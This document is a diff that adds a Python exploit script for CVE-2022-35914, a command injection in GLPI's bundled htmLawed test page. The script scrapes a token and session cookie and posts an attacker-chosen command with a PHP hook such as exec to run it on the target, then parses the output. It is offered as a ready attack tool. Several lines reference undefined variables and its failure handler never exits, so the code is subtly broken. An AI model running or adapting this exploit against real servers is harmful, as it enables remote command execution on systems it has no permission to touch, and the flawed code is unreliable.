@@ -1,0 +1,104 @@
+import argparse
+from bs4 import BeautifulSoup
+import requests
+import sys
+import re
+from rich import print as Print
+requests.packages.urllib3.disable_warnings() 
+class CVE_2022_35914:
+    def __init__(self , url:str , cmd:str , user_agent:str , check:str , hook:str):
+        Print('<github.com/elf-cyber> Edited By ELF 666\nExploit <CVE-2022-35914>')
+        self.url = url
+        self.cmd = cmd
+        self.user_agent = user_agent
+        self.check = check
+        self.hook = hook
+        self.uri = "/vendor/htmlawed/htmlawed/htmLawedTest.php"
+    
+    def fail(self):
+        return "[-] Server not vulnerable to <CVE-2022-35914>"
+        sys.exit()
+    
+    def exploit(self):
+        session = requests.Session()
+        respones_one = session.get(f"{self.url}{self.uri}",
+                                   verify = False,
+                                   headers =
+                                   {
+                                       'User-Agent': user_agent
+                                   }
+                                )
+        if respones_one.status_code != 200:
+            Print(self.fail())
+        
+        soup = BeautifulSoup(respones_one.text, 'html.parser')
+        if soup.title.text.find("htmLawed") == -1:
+            Print(self.fail())
+        
+        
+        if self.check:
+            Print("[+] Server potentially vulnerable to <CVE-2022-35914>")
+            sys.exit()
+        
+        self.token_value = soup.find_all(id='token')[0]['value']
+        self.sid_value = session.cookies.get("sid")
+        self.body = {
+           
+            "token" : token_value,
+            "text"  : cmd,
+            "hhook" : hook,
+            "sid"   : sid_value
+            }
+        
+        respones_two = session.post(f"{self.url}{self.uri}", 
+            verify = False,
+            headers = {
+                        'User-Agent': user_agent
+                     },
+            
+            data = {
+                    "token" : token_value,
+                    "text"  : cmd,
+                    "hhook" : hook,
+                    "sid"   : sid_value
+                }
+            
+            )
+        return respones_two
+    
+    def parse(self , respones):
+        soup = BeautifulSoup(respones, 'html.parser')
+        raw = soup.find_all(id='settingF')[0]
+        return_code_search_regex = "\$spec\: (.*)"
+        found_return_code = re.search(return_code_search_regex, raw.text, re.DOTALL).group(1)
+
+        output_search_regex = "\[xml:lang\] \=\> 0\n(.*)\n\)"
+        found_output = re.search(output_search_regex, raw.text, re.DOTALL)
+        Print(f"[+] Command output (Return code: <{found_return_code}>  ):" )
+        if (found_output != None):
+            raw_output = found_output.group(1)
+            cleaning_regex = ".*\=\>"
+            cleaned_output = re.sub (cleaning_regex, "", raw_output)
+            Print(cleaned_output)
+            
+    def __str__(self):
+        return 'Exploit CVE-2022-35914'
+            
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description='CVE-2022-35914 - GLPI - Command injection using a third-party library script')
+    parser.add_argument('-u', type=str, required=True, dest='url', help = "URL to test")
+    parser.add_argument('-c', type=str, required=False, dest='cmd', default = "id", help = "Command to launch (default: id)")
+    parser.add_argument('-f', type=str, required=False, dest='hook', default = "exec", help = "PHP hook function (default: exec)")
+    parser.add_argument('--check', action="store_true", dest='check', help = "Just check, no command execution.")
+    parser.add_argument('--user-agent', type=str, required=False, default="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36", dest='user_agent', help = "Custom User-Agent")
+    args = parser.parse_args()
+    
+    exploit = CVE_2022_35914(
+                url=args.url,
+                cmd=args.cmd,
+                user_agent=args.user_agent,
+                check=args.check,
+                hook=args.hook
+            )
+    respones = exploit.exploit()
+    exploit.parse(respones=respones)
